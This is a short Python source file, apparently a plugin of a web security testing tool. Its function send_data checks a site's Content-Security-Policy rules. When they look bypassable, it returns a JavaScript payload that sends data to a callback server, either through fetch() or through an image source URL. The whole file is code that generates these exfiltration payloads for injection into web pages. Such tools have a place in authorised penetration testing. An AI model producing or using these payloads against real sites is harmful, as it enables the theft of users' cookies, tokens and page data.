from typing import Dict, List, Optional
from plugin.csp_check import CSPCheck 

def send_data(csp_rules: Dict[str, str], raw_data: str, callback_server: str) -> Optional[str]:
    (is_bypassable, vulnerable_reasons) = CSPCheck.csp_check(csp_rules)
    
    if not is_bypassable:
        return None 

    vulnerabilities_str = " ".join(vulnerable_reasons)
    final_poc = None

    if "'connect-src'" in vulnerabilities_str:
        final_poc = f"fetch('{callback_server}/?data='+{raw_data})"
    elif "'img-src'" in vulnerabilities_str:
        final_poc = f"new Image().src='{callback_server}/?data='+{raw_data}"
    return final_poc